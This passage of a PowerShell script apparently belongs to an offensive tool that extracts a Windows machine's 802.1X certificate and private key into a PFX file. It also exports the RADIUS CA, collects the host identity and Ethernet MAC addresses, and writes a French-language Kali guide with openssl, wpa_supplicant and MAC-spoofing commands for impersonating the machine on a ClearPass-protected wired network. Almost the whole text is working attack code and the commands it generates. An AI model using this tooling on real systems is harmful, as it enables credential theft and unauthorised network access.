Write-Host "[*] Thumbprint: $($target.Thumbprint)" -ForegroundColor Cyan
Write-Host ""

$kaliDir = Join-Path $OutputDir "8021x_kali"
if (-not (Test-Path $kaliDir)) { New-Item -ItemType Directory -Path $kaliDir -Force | Out-Null }

$pfxFile = "$($env:COMPUTERNAME)_$($target.Thumbprint.Substring(0,8)).pfx"
$outPath = Join-Path $kaliDir $pfxFile
$log = ""
$pfx = [CngExtractor]::ExtractPfx($target.Cert, $PfxPassword, [ref]$log)

$log.Split("`n") | ForEach-Object { $l = $_.TrimEnd(); if ($l) {
    $col = "Gray"
    if ($l.StartsWith("[+]")) { $col = "Green" }
    elseif ($l.StartsWith("[-]")) { $col = "Red" }
    elseif ($l.StartsWith("[!]")) { $col = "Magenta" }
    Write-Host $l -ForegroundColor $col
}}

if (-not $pfx -or $pfx.Length -eq 0) {
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Red
    Write-Host "  ALL METHODS FAILED" -ForegroundColor Red
    Write-Host "=============================================" -ForegroundColor Red
    exit 1
}

[System.IO.File]::WriteAllBytes($outPath, $pfx)
Write-Host ""
Write-Host "=============================================" -ForegroundColor Green
Write-Host "  EXPORT SUCCESSFUL" -ForegroundColor Green
Write-Host "=============================================" -ForegroundColor Green
Write-Host "  PFX:        $outPath" -ForegroundColor Cyan
Write-Host "  Size:       $($pfx.Length) bytes" -ForegroundColor White
Write-Host "  Password:   $PfxPassword" -ForegroundColor White
Write-Host "  Subject:    $($target.Subject)" -ForegroundColor White
Write-Host "  Thumbprint: $($target.Thumbprint)" -ForegroundColor White
Write-Host ""

# =============================================
#  PHASE 2: Detect RADIUS server CA
# =============================================
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  Detecting RADIUS server CA..." -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

$radiusCaPem = ""
$radiusCaSubject = ""

# Method A: Parse wired 802.1X profile XML for TrustedRootCA thumbprints
$profileDir = Join-Path $OutputDir "wlan_profiles_tmp"
$foundFromProfile = $false
try {
    if (-not (Test-Path $profileDir)) { New-Item -ItemType Directory -Path $profileDir -Force | Out-Null }
    $exp = netsh lan export profile folder="$profileDir" 2>&1
    $xmlFiles = Get-ChildItem $profileDir -Filter "*.xml" -ErrorAction SilentlyContinue
    foreach ($xf in $xmlFiles) {
        [xml]$profileXml = Get-Content $xf.FullName -Encoding UTF8
        $ns = New-Object Xml.XmlNamespaceManager($profileXml.NameTable)
        $ns.AddNamespace("t","http://www.microsoft.com/provisioning/EapTlsConnectionPropertiesV1")
        $trustedCAs = $profileXml.SelectNodes("//t:TrustedRootCA", $ns)
        if (-not $trustedCAs -or $trustedCAs.Count -eq 0) {
            $trustedCAs = $profileXml.SelectNodes("//TrustedRootCA")
        }
        if ($trustedCAs -and $trustedCAs.Count -gt 0) {
            Write-Host "[+] Found TrustedRootCA in wired profile:" -ForegroundColor Green
            foreach ($tca in $trustedCAs) {
                $tp = $tca.InnerText.Trim() -replace " ","" -replace "-",""
                $tpUp = $tp.ToUpper()
                Write-Host "    Thumbprint: $tp" -ForegroundColor White
                $caCert = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Thumbprint.ToUpper() -eq $tpUp }
                if (-not $caCert) { $caCert = Get-ChildItem Cert:\LocalMachine\CA | Where-Object { $_.Thumbprint.ToUpper() -eq $tpUp } }
                if (-not $caCert) { $caCert = Get-ChildItem Cert:\LocalMachine\AuthRoot | Where-Object { $_.Thumbprint.ToUpper() -eq $tpUp } }
                if ($caCert) {
                    Write-Host "    Subject: $($caCert.Subject)" -ForegroundColor White
                    $radiusCaPem += "-----BEGIN CERTIFICATE-----`n"
                    $radiusCaPem += [Convert]::ToBase64String($caCert.RawData, 'InsertLineBreaks')
                    $radiusCaPem += "`n-----END CERTIFICATE-----`n"
                    $radiusCaSubject = $caCert.Subject
                    $foundFromProfile = $true
                } else {
                    Write-Host "    [-] Cert NOT in store (thumbprint not found)" -ForegroundColor Yellow
                }
            }
        }
    }
    Remove-Item $profileDir -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "[-] Profile parse error: $_" -ForegroundColor Yellow
    Remove-Item $profileDir -Recurse -Force -ErrorAction SilentlyContinue
}

# Method B: Fallback - find AD CS root CA matching this machine's domain
if (-not $foundFromProfile) {
    Write-Host "[*] Profile CA not found, scanning root store..." -ForegroundColor Yellow
    $domainParts = ((Get-WmiObject Win32_ComputerSystem).Domain -split "\.")
    $adCsCAs = @()
    foreach ($rootCert in (Get-ChildItem Cert:\LocalMachine\Root)) {
        $subj = $rootCert.Subject
        $matchDomain = $false
        foreach ($dp in $domainParts) {
            if ($dp.Length -ge 3 -and $subj -match [regex]::Escape($dp)) { $matchDomain = $true; break }
        }
        if ($matchDomain -and $subj -match "DC=") { $adCsCAs += $rootCert }
    }
    if ($adCsCAs.Count -eq 0) {
        $adCsCAs = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Subject -match "DC=" -and $_.Issuer -eq $_.Subject }
    }
    if ($adCsCAs) {
        foreach ($ca in $adCsCAs) {
            Write-Host "[+] AD CS root CA: $($ca.Subject)" -ForegroundColor Green
            $radiusCaPem += "-----BEGIN CERTIFICATE-----`n"
            $radiusCaPem += [Convert]::ToBase64String($ca.RawData, 'InsertLineBreaks')
            $radiusCaPem += "`n-----END CERTIFICATE-----`n"
            $radiusCaSubject = $ca.Subject
            $foundFromProfile = $true
        }
    }
}

# Method C: Last resort - all root CAs
if (-not $foundFromProfile) {
    Write-Host "[-] No AD CS CA found, exporting ALL root CAs as fallback..." -ForegroundColor Yellow
    Get-ChildItem Cert:\LocalMachine\Root | ForEach-Object {
        $radiusCaPem += "-----BEGIN CERTIFICATE-----`n"
        $radiusCaPem += [Convert]::ToBase64String($_.RawData, 'InsertLineBreaks')
        $radiusCaPem += "`n-----END CERTIFICATE-----`n"
    }
}

$caPemPath = Join-Path $kaliDir "ca-radius.pem"
[IO.File]::WriteAllText($caPemPath, $radiusCaPem)
Write-Host "[+] RADIUS CA:  $caPemPath" -ForegroundColor Green

# =============================================
#  PHASE 3: Detect identity & MACs
# =============================================
Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  Detecting 802.1X identity..." -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

$fqdn = "$($env:COMPUTERNAME).$((Get-WmiObject Win32_ComputerSystem).Domain)".ToLower()
$identity = "host/$fqdn"
Write-Host "[+] Machine identity: $identity" -ForegroundColor Green

$macs = @()
Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Where-Object {
    $_.InterfaceDescription -notmatch "Wi-?Fi|Wireless|Bluetooth"
} | ForEach-Object {
    $macs += [PSCustomObject]@{
        Name = $_.Name
        MAC = $_.MacAddress.Replace("-",":").ToLower()
        Status = $_.Status
        Desc = $_.InterfaceDescription
    }
}

# =============================================
#  PHASE 4: Generate config and commands
# =============================================

# Generate wpa_supplicant config
$wpaConf = @"
ctrl_interface=/var/run/wpa_supplicant
ap_scan=0
network={
    key_mgmt=IEEE8021X
    eapol_flags=0
    eap=TLS
    identity="$identity"
    client_cert="cert.pem"
    private_key="key.pem"
    ca_cert="ca-radius.pem"
}
"@
[IO.File]::WriteAllText((Join-Path $kaliDir "wpa_8021x.conf"), $wpaConf)

# Generate commands.txt
$macLines = ""
if ($macs.Count -gt 0) {
    $macLines += "# MACs Ethernet de la machine $($env:COMPUTERNAME):`n"
    foreach ($m in $macs) {
        $st = if ($m.Status -eq "Up") { "(ACTIVE)" } else { "(down)" }
        $macLines += "#   $($m.MAC)  $st  $($m.Desc)`n"
    }
    $macLines += @"

sudo ip link set eth0 down
sudo ip link set eth0 address $($macs[0].MAC)
sudo ip link set eth0 up
"@
}

$commands = @"
====================================================
  802.1X EAP-TLS - Commandes Kali Linux
  Machine: $fqdn
  Identity: $identity
====================================================

Fichiers dans ce dossier:
  - $pfxFile   (cert + cle privee, password: $PfxPassword)
  - ca-radius.pem            (CA du serveur RADIUS)
  - wpa_8021x.conf           (config wpa_supplicant prete)

====================================================
  ETAPE 1: Extraire cert et cle depuis le PFX
====================================================

openssl pkcs12 -in $pfxFile -clcerts -nokeys -out cert.pem -passin pass:$PfxPassword
openssl pkcs12 -in $pfxFile -nocerts -nodes -out key.pem -passin pass:$PfxPassword

====================================================
  ETAPE 2: Connexion 802.1X
====================================================

# Lancer wpa_supplicant (remplacer eth0 par ton interface)
sudo wpa_supplicant -i eth0 -c wpa_8021x.conf -D wired -d

# Dans un autre terminal, obtenir une IP
sudo dhclient eth0

====================================================
  (OPTIONNEL) Spoof MAC
====================================================

$macLines

====================================================
  NOTES
====================================================

- ca-radius.pem = CA qui a signe le cert du SERVEUR RADIUS
  (PAS la CA du cert client, ce sont 2 PKI differentes !)

- ap_scan=0 et eapol_flags=0 sont obligatoires pour le filaire

- L'identity DOIT etre au format host/FQDN

- Le spoof MAC n'est PAS obligatoire (ClearPass ne filtre pas par MAC)
"@
[IO.File]::WriteAllText((Join-Path $kaliDir "commands.txt"), $commands)

Write-Host ""
Write-Host "=============================================" -ForegroundColor Green
Write-Host "  KALI OUTPUT FOLDER" -ForegroundColor Green
Write-Host "=============================================" -ForegroundColor Green
Get-ChildItem $kaliDir | ForEach-Object {
    Write-Host "  $($_.Name)  ($($_.Length) bytes)" -ForegroundColor White
}
Write-Host ""
Write-Host "  -> $kaliDir" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Copie ce dossier sur ta Kali et suis commands.txt" -ForegroundColor Yellow
Write-Host ""
